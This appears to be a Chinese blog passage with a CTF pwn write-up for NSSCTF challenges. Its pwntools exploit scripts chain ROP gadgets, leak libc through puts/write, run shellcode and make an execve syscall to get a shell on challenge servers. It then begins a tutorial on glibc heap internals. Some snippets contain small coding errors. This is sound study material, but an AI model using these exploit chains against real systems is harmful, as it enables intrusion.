p64(vuln) io.sendline(payload) io.recv() io.interactive() ROP PWN-5\nchecksec：\nvuln = 0x4011dd\n题目都给提示了，那就是构造ROP攻击链了，比较简单，多加个ret的gadget就可以了，用ROPgadget命令查询到ret的gadget地址：\n1 ROPgadget --binary main | grep \u0026#34;ret\u0026#34; ret_address = 0x000000000040101a\nexp内容就和上题差不多：\n1 2 3 4 5 6 7 8 9 from pwn import * io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 25982) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) vuln = 0x4011dd ret_address = 0x000000000040101a payload = cyclic(0x20+8) + p64(ret_address) + p64(vuln) io.sendline(payload) io.recv() io.interactive() ROPgadget PWN-6\nchecksec：\n这次你可以发现：\nsystem参数不再是/bin/sh了，那我们就需要构造出system(\u0026quot;/bin/sh\u0026quot;);\nsystem函数地址是0x4011A5\nsystem只需要传递一个参数，那么只需要rdi寄存器，那还是用到ROPgadget：\npop_rdi_ret = 0x000000000040125b\nAlt+T搜索/bin/sh字符串：\n/bin/sh的地址：0x404048\nexp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * io = remote(\u0026#39;node7.anna.nssctf.cn\u0026#39;, 22526) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) binsh = 0x404048 pop_rdi_ret = 0x000000000040125b system = 0x4011A5 payload = cyclic(0x40+8) + p64(pop_rdi_ret) + p64(binsh) + p64(system) io.recvline() io.sendline(payload) io.recv() io.interactive() 这里不用system=elf.sym[\u0026lsquo;system\u0026rsquo;]的原因是我在读汇编时恰好看到这个system地址，直接用硬编码地址更准确。\nret2shellcode PWN-7\nchecksec结果依旧一样\u0026hellip;不展示了。\nIDA64位分析：\nv3 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);\n分配一块 4KB（0x1000 字节）的内存区域;第三个参数7：内存权限为 `PROT_READ，意味着可读可写可执行，往里边注入shellcode也能执行。\n有read函数，读取0x1000长度到v3中，mmap直接分配了PROT_EXEC权限的内存，无需通过漏洞绕过权限限制，通过mmap函数分配内存，普通程序中注入 shellcode 常受限制（如栈不可执行NX、内存权限不足），但这段代码主动消除了所有障碍。\nexp：\n1 2 3 4 5 6 7 from pwn import * io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 25024) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) shellcode = asm(shellcraft.sh()) io.recvline() io.sendline(shellcode) io.interactive() ret2sys main.zip\nchecksec：\nIDA64分析：\n没开canary保护，那就出现栈溢出漏洞，填充0x30+8。\nshift+F12看到字符串这一栏：\n发现没有system函数，但我们需要构造出system(\u0026quot;/bin/sh\u0026quot;);这个函数样式，又因为题目给了我们有个标准libc.so.6的文件，那我们大致思路就是从里边获取system等一些能getshell函数，因为有偏移量，所以说需要先泄露这个题目程序的地址获取基地址，然后才能反推出system在这个程序的真实地址，这样就能执行system函数，再构造ROP攻击链。\n大致框架：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context(os = \u0026#39;linux\u0026#39;, arch = \u0026#39;amd64\u0026#39;, log_level = \u0026#39;debug\u0026#39;) io = remote(\u0026#39;node7.anna.nssctf.cn\u0026#39;, 20072) #io = process(\u0026#39;./main\u0026#39;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) ... payload = cyclic(0x30+8) + ... io.sendline(payload) io.interactive() 泄露地址，在main函数分析得知，我们只能泄露puts函数了。\nROP链构造，用pop_rdi传参。\npayload1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * context(os = \u0026#39;linux\u0026#39;, arch = \u0026#39;amd64\u0026#39;, log_level = \u0026#39;debug\u0026#39;) io = remote(\u0026#39;node7.anna.nssctf.cn\u0026#39;, 20072) #io = process(\u0026#39;./main\u0026#39;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) main = elf.sym[\u0026#34;main\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] puts=0x401030 #IDA上可以找到 pop_rdi = 0x000000000040122b payload1 = cyclic(0x30+8) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main) #执行main函数不会让程序下线，从而能继续上传后续的payload2. io.recvuntil() io.sendline(payload1) 我们用puts函数本身去把它自己函数地址打印出来，用u64接收保存到一个变量上，此时puts真实地址泄露了，那我们可以用libc.so.6去泄露出偏移量，然后得到本程序其他函数的真实地址。\n1 2 3 4 puts_read_address=u64(r.recvuntil(\u0026#34;\\n\u0026#34;,drop=True).ljust(0x8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_read_address)) libc_base=puts_addr-libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc_base)) libc_base已经泄露了，那我们反推出/bin/sh地址：\n当然不是很熟悉PWN的可以单独运行，高手可以直接引入binsh_offset = next(libc.search(b\u0026quot;/bin/sh\u0026quot;))，省去复制粘贴😄：\n1 2 3 4 from pwn import * libc = ELF(\u0026#34;./libc.so.6\u0026#34;) binsh_offset = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) print(hex(binsh_offset)) system函数我们直接用libc查找到偏移量，再加上我们之前泄露出来的基地址libc_base就好。\nfake_payload2：\n1 payload2 = cyclic(0x30+8) + p64(pop_rdi) + p64(binsh+libc_base) + p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) 欸不对\u0026hellip;这可是x86-64架构！还没有栈对齐呢，0x30+8不是16整数，所以需要栈对齐，执行一下ret返回一下，可以用ROPgadget查，我直接给ret：0x401016，当然可以用pop_rdi+1。\npayload2:\n1 2 3 4 payload2 = cyclic(0x30+8) + p64(pop_rdi + 1) + p64(pop_rdi) + p64(binsh+libc_base) + p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) #ret = 0x401016 #payload2 = cyclic(0x30+8) + p64(ret) + p64(pop_rdi) + p64(binsh+libc_base) + p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) 为什么可以这样？pop_rdi + 1 指向的是 pop_rdi gadget 中 ret 指令的地址（跳过前面的 pop rdi 指令）。执行这个地址时，只会执行 ret 指令，作用是多一次栈指针调整，让栈对齐到 16 字节，省去你去查单独的ret的gadget地址了。\n那么exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 [P9.zip](P9.zip) [P9.zip](P9.zip) from pwn import * #io=process(\u0026#34;./main\u0026#34;) context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 27473) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) pop_rdi=0x40122b binsh=0x1b75aa system=libc.sym[\u0026#34;system\u0026#34;] puts=0x401030 puts_got = elf.got[\u0026#39;puts\u0026#39;] main = elf.sym[\u0026#39;main\u0026#39;] payload1 = cyclic(0x30+8) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main) io.recvline() io.sendline(payload1) io.recvline() puts_read_address = u64(io.recvuntil(\u0026#34;\\n\u0026#34;,drop=True).ljust(0x8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_read_address)) libc_base = puts_read_address - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc_base)) ret = 0x401016 #payload2 = cyclic(0x30+8) + p64(ret) + p64(binsh + libc_base) + p64(libc_base+libc.sym[\u0026#34;system\u0026#34;]) payload2 = cyclic(0x30+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh + libc_base) + p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) io.recvline() io.sendline(payload2) io.interactive() ret2libc P9.zip\nchecksec：\n64位，开NX保护，关canary、PIE保护。\n栈溢出需要填充0x40+8，且程序目前只有write函数可以泄露。\n1 2 3 4 5 // attributes: thunk ssize_t write(int fd, const void *buf, size_t n) { return write(fd, buf, n); } 找到了write_plt的地址了。\n接下来编写exp时，gadget的地址自行查询了。\n那么在泄露write函数时，有三个变量，就应该需要pop_rdi_rsi_rdx_ret这一个gadget，但真的有这一个gadget吗？\n可以看到是缺失一个rdx寄存器的gadget的，而这个寄存器刚好控制的是write函数的size大小限制，我们上传的内容只要不是很大的话，还是可以忽略的，主要还是前面两个寄存器控制的变量比较重要。\n但是有rdi寄存器的gadget只有一个，还是带有r15的，这可怎么办？\n在二进制文件中，很难直接找到完美的 pop rsi; ret gadget（仅弹出 rsi 并返回），更多时候会遇到 pop rsi; pop r15; ret 这类 gadget（连续弹出两个寄存器）。\n使用这个 gadget 时，必须在栈上提供 两个值：第一个给 rsi（有用参数），第二个给 r15（无用，但必须填充以让 ret 正确取地址），p64(0) 被弹出到 r15（仅占位，值可以是任意的，通常用 0 或垃圾数据）。这样子pop rsi; pop r15; ret⇔ pop rsi; ret了。\npayload1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * #io=process(\u0026#34;./main\u0026#34;) context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) io = connect(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 25379) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) main = elf.sym[\u0026#39;main\u0026#39;] pop_rdi = 0x0000000000401283 pop_rsi_r15 = 0x0000000000401281 write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] payload1 = cyclic(0x40+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main) io.recvline() io.sendline(payload1) 这时候已经泄露了write的真实地址了，然后我们就泄露libc的偏移量反推出程序的基地址，最后得出其它函数在这个“main”程序的真实地址、进行调用从而getshell得flag。\n得出基地址：\n1 2 3 4 io.recvuntil(\u0026#34;OK! Bye~\u0026#34;) write_read_address = u64(io.recv(8)) libc_base = write_read_address - libc.sym[\u0026#39;write\u0026#39;] print(hex(libc_base)) 构造ROP链执行system(\u0026quot;/bin/sh\u0026quot;);后门函数：\npayload2：\n1 2 3 4 5 6 7 8 io.recvuntil(\u0026#34;OK! Bye~\u0026#34;) write_read_address = u64(io.recv(8)) libc_base = write_read_address - libc.sym[\u0026#39;write\u0026#39;] print(hex(libc_base)) system = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_offset = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) binsh = libc_base + binsh_offset payload2 = cyclic(0x40+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(system) exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pwn import * #io=process(\u0026#34;./main\u0026#34;) context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) io = connect(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 25379) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) main = elf.sym[\u0026#39;main\u0026#39;] pop_rdi = 0x0000000000401283 pop_rsi_r15 = 0x0000000000401281 write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] payload1 = cyclic(0x40+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main) io.recvline() io.sendline(payload1) io.recvuntil(\u0026#34;OK! Bye~\u0026#34;) write_read_address = u64(io.recv(8)) libc_base = write_read_address - libc.sym[\u0026#39;write\u0026#39;] print(hex(libc_base)) system = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_offset = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) binsh = libc_base + binsh_offset payload2 = cyclic(0x40+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(system) io.sendline(payload2) io.interactive() 综合练习 P10.zip\n先给各位大佬抛出个问题，求解决：为什么调用不了system函数去getshell？调试不了栈对齐\u0026hellip;\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * #io=process(\u0026#34;./main\u0026#34;) context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 24302) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) main = elf.sym[\u0026#39;main\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] binsh_offset = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) pop_rdi = 0x000000000040122b payload1 = cyclic(0x30+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) io.recvuntil(b\u0026#34;No system now. Tell me!\\n\u0026#34;) io.sendline(payload1) io.recvline() puts_read_address = u64(io.recvuntil(\u0026#34;\\n\u0026#34;, drop=True).ljust(0x8, b\u0026#39;\\x00\u0026#39;)) libc_base = puts_read_address - libc.sym[\u0026#39;puts\u0026#39;] system = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh = binsh_offset + libc_base io.recvuntil(b\u0026#34;No system now. Tell me!\\n\u0026#34;) payload2 = cyclic(0x30+8) + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(system) io.sendline(payload2) io.interactive() checksec：\n64位半开RELRO、关闭canary、PIE保护、全开NX保护。\nIDA64位分析：\n有栈溢出漏洞，填充0x30+8，给了提示说没有system函数，还需要我们泄露基地址，构造ROP。\n大致思路就是泄露puts函数的地址，结合libc的偏移量得出程序的函数基地址，再反推出其他函数在程序的真实地址，从而进行调用。\n泄露puts函数地址：\nputs的got表和plt表的地址都知道了。\npayload1：\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * #io = process(\u0026#39;./main\u0026#39;) io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 25478) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) puts_plt = 0x0000000000401030 puts_got = 0x0000000000404018 binsh_offset = 0x1b75aa main = elf.sym[\u0026#39;main\u0026#39;] pop_rdi = 0x000000000040122b payload1 = cyclic(0x30+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) io.sendline(payload1) 泄露完之后接收地址，算出基地址libc_base:\n1 2 3 4 puts_read_address = u64(io.recvuntil(\u0026#34;/n\u0026#34;, drop = True),ljust(0x8,b\u0026#39;\\00\u0026#39;)) libc_base = puts_real_address - libc.sym[\u0026#39;puts\u0026#39;] print(hex(libc_base)) binsh = libc_base + binsh_offset 我起初的思路是想调用system函数的，但不知为何栈一直对不齐，各位师傅可以去开头那看一下我的exp，那现在我只能用syscall函数了\u0026hellip;\u0026hellip;也就是调用execve函数。\n直接调用 syscall 对栈对齐的要求远没有 system 函数严格，核心原因是 两者的执行层级和依赖不同：system 是 libc 封装的函数，内部有栈帧约束；而 syscall 是直接触发内核指令，对用户态栈的对齐要求极低。\n用 syscall 触发 execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)，哪怕 ROP 链中没有刻意加 ret 对齐，也能正常getshell。\n那么现在我们了解一下这个execve函数：execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\n1 2 3 4 5 rax 0x3b rdi \u0026#34;/bin/sh\u0026#34; rsi 0 rdx 0 syscall 那我们就需要有这些寄存器的gadget了。\n在程序中找到一个有r15寄存器的gadget，这不合我们要求，当然我们可以覆盖掉，题目给了libc.so.6文件，我们又求出了基地址，可以用libc的gadget偏移量——pop rsi ; ret，这样就不用再去覆盖了。\n那这个有rax的gadget也是这样：\n没有单独的rdx啊，随便挑一个都可以，把用不到的寄存器都覆盖掉就好。\nsyscall：\n1 2 3 4 5 pop_rax_offset = 0x000000000004a550 pop_rsi_offset = 0x0000000000027529 pop_rdx_pop_rbx_offset = 0x00000000001626d6 pop_rdi = 0x000000000040122b syscall_offset = 0x000000000002584d 那么payload2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 io.recvline() puts_addr = u64(io.recvuntil(\u0026#34;\\n\u0026#34;,drop=True).ljust(0x8,b\u0026#39;\\x00\u0026#39;)) libc_base = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] print(hex(libc_base)) binsh = libc_base + binsh_offset pop_rax_offset = 0x000000000004a550 pop_rsi_offset = 0x0000000000027529 pop_rdx_pop_rbx_offset = 0x00000000001626d6 pop_rdi = 0x000000000040122b syscall_offset = 0x000000000002584d #这几个gadget都是源自libc.so.6，都是偏移量，需要加上程序基地址才能得出可用的真实地址 syscall = libc_base + syscall_offset payload2 = cyclic(0x30+8) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi_offset+libc_base) + p64(0) + p64(pop_rdx_pop_rbx_offset+libc_base) + p64(0) + p64(0) + p64(pop_rax_offset+libc_base) + p64(0x3b) + p64(syscall) #0x3b是execve函数的系统调用号——execve(\u0026#34;/bin/sh\u0026#34;, 0, 0) \u0026#34;\u0026#34;\u0026#34; rax 0x3b rdi \u0026#34;/bin/sh\u0026#34; rsi 0 rdx 0 syscall \u0026#34;\u0026#34;\u0026#34; #需要注意的是，libc中查询得到的含rdx的gadget并不是单独的，需要多一个p64(0)将其覆盖 #gdb.attach(io) io.sendline(payload2) io.interactive() 完整exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 from pwn import * #io = process(\u0026#39;./main\u0026#39;) io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 24302) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = ELF(\u0026#34;./main\u0026#34;) puts_plt = 0x0000000000401030 puts_got = 0x0000000000404018 binsh_offset = 0x1b75aa main = elf.sym[\u0026#39;main\u0026#39;] pop_rdi = 0x000000000040122b payload1 = cyclic(0x30+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) io.recvline() io.sendline(payload1) io.recvline() puts_addr = u64(io.recvuntil(\u0026#34;\\n\u0026#34;,drop=True).ljust(0x8,b\u0026#39;\\x00\u0026#39;)) libc_base = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] print(hex(libc_base)) binsh = libc_base + binsh_offset pop_rax_offset = 0x000000000004a550 pop_rsi_offset = 0x0000000000027529 pop_rdx_pop_rbx_offset = 0x00000000001626d6 pop_rdi = 0x000000000040122b syscall_offset = 0x000000000002584d syscall = libc_base + syscall_offset payload2 = cyclic(0x30+8) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi_offset+libc_base) + p64(0) + p64(pop_rdx_pop_rbx_offset+libc_base) + p64(0) + p64(0) + p64(pop_rax_offset+libc_base) + p64(0x3b) + p64(syscall) #gdb.attach(io) io.sendline(payload2) io.interactive() 总结 这十道题说实话质量还不错，体验感很棒。\n官网有官方WP，我这只是个人WP，有些许区别，感兴趣的师傅可以一起在在评论区交流😄！\n","date":"2025-10-01T00:00:00Z","headings":[{"id":"pwn介绍","level":2,"text":"PWN介绍\n"},{"id":"pwntools与gbd使用","level":2,"text":"Pwntools与GBD使用\n"},{"id":"整数溢出","level":2,"text":"整数溢出\n"},{"id":"ret2text及其变种","level":2,"text":"ret2text及其变种\n"},{"id":"rop","level":2,"text":"ROP\n"},{"id":"ropgadget","level":2,"text":"ROPgadget\n"},{"id":"ret2shellcode","level":2,"text":"ret2shellcode\n"},{"id":"ret2sys","level":2,"text":"ret2sys\n"},{"id":"ret2libc","level":2,"text":"ret2libc\n"},{"id":"综合练习","level":2,"text":"综合练习\n"},{"id":"总结","level":2,"text":"总结\n"}],"image":"https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF_hu_8af0ec0344f7755e.png","permalink":"https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/","title":"NSSctf-专题PWN-writeup"},{"content":"[TOC]\n前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\n在前面的章节中，我们已经粗略的了解了栈相关的知识点： ROP、shellcode、栈转移等。\n内存中还有一块区域叫做堆（heap）。\n接下来的一整章的内容，我们就来讲堆。\n堆章节比较抽象，我还刻意加了很多图，但依旧比栈章节要更加抽象\u0026hellip;，以至于作者也学的迷迷糊糊，看不懂的欢迎来评论区讨论。\nLinux动态内存管理机制 什么是堆？+\n堆是程序用于分配动态内存的一段内存区域。 他独立的存在于内存中，介于程序内存 基地址和libc地址之间，从低地址向高地址生长，与用户打交道最多。\n带你举个例子理解动态分配内存：\n开一个统计表格，每人最多输入的最大内存长度是4096个字节，按照以往惯性思维去分配的话，你是不是应该每人都在之前填表时就已经分好了内存给他们了，但不是每个人都能用完这4096个字节的，有些人只输入一个字节，那就意味着就有4095个字节的内存区域被浪费，如果每个人都这样做或输入少于最大字节长度的内存的数据，是不是浪费更多？\n对于这种现象的下一步应该是回收，怎么回收？\n那么，有没有一种方法，能让程序根据用户所需要的内存长度大小来分配内存呢？并且不需要我们管理内存呢？有的，在libc中，我们可以通过malloc(size)来给用户分配一段长度为size的内存，通过free(ptr)来释放这段内存区域。 这些数据，被统一的存放在了堆中，维护这些数据的运行机制在glibc中，称之为ptmalloc。\n堆的内存管理机制 堆是真无敌恶心\u0026hellip;.堆的管理机制相比于栈十分复杂，可以算是对我这样0基础的萌新杀手。\n但是堆的漏洞比栈有更多的形式和利用方式，而且堆漏洞所需要的条件比栈更 少。 一般情况下栈溢出起码需要16个字节，也就是至少溢出到返回地址才能利用，但是堆的话只需要一个字节就可完成利用，甚至这个字节可以是个\\x00,也就是空字节，nullbyte。\n栈的话基本都会关闭一两个保护机制，堆的话一般全开。\nCTFpwn的主流是堆利用。\n堆块介绍 chunk 在了解ptmalloc的内存管理机制前，我们先了解一下堆块在内存中的存储形式。在内存中，堆是以一个个堆块构成的,这些堆块称之为chunk。\n在64位系统中，堆块的大小是8字节对齐的,也就是说，我们申请一个15字节长度的堆块，实际到我们手中的用户可控的数据区域大小为16字节。\n但是在管理中，一个堆块除了用户数据区外，还有头部字段，头部字段的长度为16字节。同时在64位系统中，一个堆块最小长度为32字节（包括头部），也就是说，我们分配一个1字节的堆块，他的实际长度是32字节。\nprev_size和size字段分别代表一个chunk对的大小，大小都是8字节，两个一共16字节，称之为chunk的头部字段。后面的user data区域是用户可以输入数据的地方。\nchunk的大小8字节对齐，所以说对于分配器来说，0x80、0x81、0x82大小的堆块都是一样的，都为0x80大小。\n可能你举得有点懵，但这是一种简化表述，核心是堆块大小必须满足 8 字节对齐，所以分配器会把不满足的大小调整到最近的 8 字节对齐的大小，这样就会出现多个请求大小对应同一个实际分配大小的情况。\n为了节省空间，将size的最低三个bit设置为三个标志位。\n从高到低分别为non_main_arena、is_mmap、prev_inuse，这里分别解释一下：\nnon_main_arena用来记录当前chunk是否不属于主线程,1表示不属于，0表示属于。\nis_mmap表示当前chunk是否由mmap分配的，1表示属于，0表示不属于。\nprev_inuse用来表示前面紧邻的那个chunk是否正在使用，0表示前面的chunk已经被释放，1表示正在被用户使用。\nprevsize记录前面一个chunk的大小。这里注意，prevsize只有在前面的chunk被free掉的时候才生效，也就是说，只有在prev_inuse为0的时候，系统才把prev_size字段当作prevsize。\n那么其他时候这个字段有用吗？没用的话不就浪费了八个字节？\n有用的！如果chunk正在被使用，那么他会把下一个chunk的prevsize字段当作userdata。充分利用空间。\n也就是说，如果我们申请一个0x80长度大小的区域，系统实际给我们0×90大小（0x10头部），如果我们申请0x88大小的区域，系统同样也会给我们0x90大小的区域（算头部），剩下的8字节，使用nextchunk的prevsize区域。因为，只有当一个chunk被释放的时候，nextchunk的prevsize才真正代表前一个chunk的大小，所以就这么设计了。\ntopchunk topchunk是一个特殊的chunk，类似于bss字段未被分配的内存一样，比较原始的。\n最开始时，程序的堆还未被使用，整个的堆区域属于一个很大的堆块叫做topchunk。当已经被使用的空间不够时，程序就会从topchunk中分割一块出来个程序使用。\n堆块的管理 为了保证程序的快速运行，而且方便系统内存管理，所以ptmalloc将释放后的堆块根据其大小分成不同的bin。\nfastbin：大小范围从0x20-0×80\nsmallbin：大小范围：0×90-0x400\nLarge bin：大小范围：0x410以上\nunsortedbin：未被归类的bin，临时存储用，存放的堆块大小不一定多大，后续详细介绍。\nchunk被free之后如图：\n由于chunk被free了，所以按常理说用户不应该能够访问到这个chunk。于是乎在userdata区域存放一些用于管理内存的指针信息。\nfastbin：单链表结构，只会用到fd这个指针；\nsmall \u0026amp;unsortedbin：双向链表结构，fd和bk都用；\nlargebin：双向链表，fd、bk都用，同时还会用fd nextsize和bk nextsize。\n堆块的合并操作 如果我们free掉一个堆块，（可能）会触发向前合并和向后合并。\n向前合并：检查当前chunk的prev inuse位，如果为0，则根据当前chunk的prev size找到prev chunk的头，两个堆块合并；\n向后合并：检查当前chunk的next next chunk的prev inuse位（因为一个堆块的状态由他后面chunk的prev inuse位决定，所以确定next chunk的状态需要检查next next chunk的prev inuse位，怎么找? size就行），然后根据next chunk的状态决定是否合并。\n变化示意图：\n这四张图看得有点懵？说人话就是prev_inuse=0说明前面chunk被释放了，呃身体都没了你要头有什么用？我的话过重了\u0026hellip;身体（chunk）被释放free没了应该头也跟着一起灰飞烟灭！！一起消失掉，和其它堆合并。（先向前合并再考虑向后合并）\n“合并” 的关系\n向前合并（关键关联 prev_inuse = 0）\n若当前堆块的 prev_inuse = 0 时，说明前一个堆块是空闲的。此时，当前堆块可以：\n1、读取前一个堆块的头部信息（通过当前堆块的 prev_size 字段，获取前一个堆块的大小）。\n2、将 “当前堆块” 与 “前一个空闲堆块” 合并，形成一个更大的空闲堆块，减少内存碎片。\n向后合并（与 prev_inuse 无直接关联）\n1、“向后合并” 是指当前空闲堆块与后一个相邻的空闲堆块合并，其判断条件是：后一个堆块是否为空闲（通过检查后一个堆块的 prev_inuse 标志）。\nFor instace，当前堆块是空闲的，若后一个堆块的 prev_inuse = 0（说明后一个堆块认为 “前一个堆块（即当前堆块）是空闲的”），则可以进行向后合并。\n2、可见，“向后合并” 的核心是后一个堆块的 prev_inuse 标志，而非当前堆块的 prev_inuse。\n考虑到相对关系，简单来说对于当前你要讨论的堆头部来说，它的prev_inuse=0时，它本身就应该和前面的chunk合并。\n而“向后合并” 的触发条件是后一个堆块的 prev_inuse = 0（表示后一个堆块允许与前一个堆块 —— 即当前堆块 —— 合并）。\n结构体 aren\n是一块结构体，用于管理bins。主线程创建的arena称之为main_arena,其他的叫threadarena。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 struct malloc state { /* Serialize access.*/ mutex_t mutex; int flags; /*Fastbins*/ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin*/ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last remainder; /*Nromal bins packed as described above*/ mchunkptr bins[NBINS * 2 - 2]; /*Bitmap of bins*/ unsigned int binmap[BINMAPSIZE]; /*Linked list*/ struct malloc state *next; /*Linked list for free arenas.*/ struct malloc state *next_free; /* Memory allocated from the system in this arena.*/ INTERNAL_SIZE_T_system_mem; INTERNAL_SIZE_T_max_system_mem; }； 各种内存块介绍 各种bins：\nFastbin 管理fastbin free chunk，单链表结构，FILO（最后一个进入fastbin链表的，会被放在头部）总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增。\n大小属于fastbin的chunk被free掉时，不会改变next chunk的prev inuse位，也就是说不会被合并。\nUnsortedbin 管理unsorted chunk，只有一个双向链 表。所有大小大于fastbin的chunk都会先被暂 时放入unsortedbin中，链表中的chunk大小不一样。\n*注意：这里的指向箭头比较多\nSmallbin 管理small chunk，由62个双向链表组成， 每个链表中的chunk大小一样，大小以0x10递 增。长得和unsortedbin差不多的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 +-------------------+ +-------------------+ +-------------------+ | smallbin | \u0026lt;--\u0026gt; | free chunk 1 | \u0026lt;--\u0026gt; | free chunk 2 | \u0026lt;--\u0026gt; ... | (size = 0x20) | | | | | +-------------------+ +-------------------+ +-------------------+ | v +-------------------+ +-------------------+ +-------------------+ | smallbin | \u0026lt;--\u0026gt; | free chunk 1 | \u0026lt;--\u0026gt; | free chunk 2 | \u0026lt;--\u0026gt; ... | (size = 0x30) | | | | | +-------------------+ +-------------------+ +-------------------+ | v ... (更多 smallbin，大小递增) | v +-------------------+ +-------------------+ +-------------------+ | smallbin | \u0026lt;--\u0026gt; | free chunk 1 | \u0026lt;--\u0026gt; | free chunk 2 | \u0026lt;--\u0026gt; ... | (size = 0x3F0) | | | | | +-------------------+ +-------------------+ +-------------------+ Largebin 管理large chunk，63个双向链表，FIFO。同一个双线链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列。\n在此我们先不学习larbin attack的相关内容，所以看看就行，了解一下。比较少遇见Largebin的相关题。\nMalloc运行流程 了解完各种bin之后，现在来看看这：\n一、当我们调用malloc时，程序都干了些什么？\n1、计算真正的堆块的大小（加上堆头部长度、对齐）：\n判断是否在fastbin范围内：\n确定在，检查对应大小的bin链表中有无chunk。\n有，那就分配给用户，至此完成。 